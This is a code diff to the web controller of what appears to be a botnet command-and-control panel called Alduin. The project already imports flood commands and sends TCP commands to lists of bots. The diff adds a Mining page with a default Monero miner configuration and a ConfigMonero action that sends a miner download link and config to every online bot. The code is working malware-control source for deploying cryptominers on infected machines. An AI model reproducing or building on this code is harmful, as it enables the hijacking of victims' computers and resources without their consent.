@@ -9,6 +9,7 @@ using MediatR;
 using Alduin.Logic.Mediator.Queries;
 using Newtonsoft.Json;
 using Alduin.Server.Commands.Floods;
+using Alduin.Server.Commands.Commands;
 
 namespace Alduin.Web.Controllers
 {
@@ -34,7 +35,23 @@ namespace Alduin.Web.Controllers
             }
             
         }
-        
+        [Authorize]
+        public IActionResult Mining()
+        {
+            if (User.Claims.FirstOrDefault(c => c.Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/role").Value != "User")
+            {
+                var model = new MiningModel
+                {
+                    Config = "-o domain:port -u address -p User:Email -k -a --coin=monero --algo=rx/0-B"
+                };
+                return View(model);
+            }
+            else
+            {
+                return RedirectToAction(nameof(HomeController.Index), "Home");
+            }
+
+        }
         //Commands///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
         [Authorize]
         [HttpGet]
@@ -563,6 +580,32 @@ namespace Alduin.Web.Controllers
             var bots = new GetBotsByStatusQuery
             {
                 status = model.Force
+            };
+            var botlist = await _mediator.Send(bots);
+            var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
+            return Json(response);
+        }
+        [Authorize]
+        [HttpPost]
+        public async Task<IActionResult> ConfigMonero(MiningModel model)
+        {
+            var method = new BaseCommands
+            {
+                Method = "Mining"
+            };
+            var Variables = new MinerVariables
+            {
+                Link = model.Link,
+                Config = model.Config
+            };
+            var Command = new MiningCommand
+            {
+                newMinerVariables = Variables,
+                newBaseCommand = method,
+            };
+            var bots = new GetBotsByStatusQuery
+            {
+                status = false//execute online bots
             };
             var botlist = await _mediator.Send(bots);
             var response = CommandExecute.TcpConnects(botlist, JsonConvert.SerializeObject(Command).Replace(@"\", ""));
